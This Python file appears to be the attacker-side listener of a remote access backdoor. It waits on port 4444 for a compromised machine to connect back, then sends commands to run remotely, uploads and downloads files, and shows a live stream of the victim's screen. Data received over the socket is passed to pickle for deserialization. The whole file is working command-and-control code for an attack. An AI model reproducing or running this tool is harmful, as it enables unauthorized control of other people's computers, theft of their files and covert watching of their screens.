import socket , pickle , os 
import numpy as np
import cv2
import matplotlib.pyplot as plt 

class Listener:
    def __init__(self,ip,port):
        listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)

        listener.bind((ip,port))
        listener.listen(0)
        print("[+] waiting for incomming connections")
        self.connection , self.address = listener.accept()
        print("[+] Got a connection"+str(self.address))

    def reliable_send(self,command):
        command = pickle.dumps(command)
        self.connection.send(command)

    def reliable_recive(self):
        recived_data = b""
        while True:
            try:
                recived_data = recived_data + self.connection.recv(1024)
                result = pickle.loads(recived_data)
                return result
            except Exception as e:
                continue

    def execute_remotly(self,command):
        self.reliable_send(command)
        if command[0] == 'exit':
            self.connection.close()
            exit()
        return self.reliable_recive()
    
    def write_file(self,path,content):
        with open(path,"wb") as file:
            file.write(content)
        result = "[+] sucessfully downloaded"+str(path)
        return result

    def read_file(self,path):
        with open(path,'rb') as file:
            return file.read()

    def stream_recive(self):
        while True:
            data = self.reliable_recive()
            print(type(data))
            img_array = np.frombuffer(data,dtype=np.uint8)
            img = cv2.imdecode(img_array,cv2.IMREAD_COLOR)
            #img_np = cv2.resize(img, (0, 0), fx=0.5, fy=0.5)
            #img = cv2.resize(img, (640, 480))
            cv2.imshow('screen stream',img)
            cv2.waitKey(20)

            if cv2.getWindowProperty('screen stream' , cv2.WND_PROP_VISIBLE)<1:
                self.connection.send('stop'.encode('utf-8'))
                break
        cv2.destroyAllWindows()

    def run(self):
        while True:
            command = input(">> ")
            command = command.split(' ')
            if command[0] == "upload":
                read_data = self.read_file(command[1])
                read_data = pickle.dumps(read_data)
                command.append(read_data)
            #command = command.encode('utf-8')
            #self.connection.send(command)
            #self.result = self.connection.recv(1024)
            #self.result = self.result.decode('utf-8')
            if command[0] == 'screen':
                command = pickle.dumps(command)
                self.connection.send(command)
                result = self.stream_recive()
            else:
                result = self.execute_remotly(command)
            
            if command[0] == 'download':
                result = self.write_file(command[1],result)
            try:
                result = result.decode('utf-8')
            except AttributeError:
                result = result 
            print(result)


my_listener = Listener("192.168.0.135",4444)
my_listener.run()

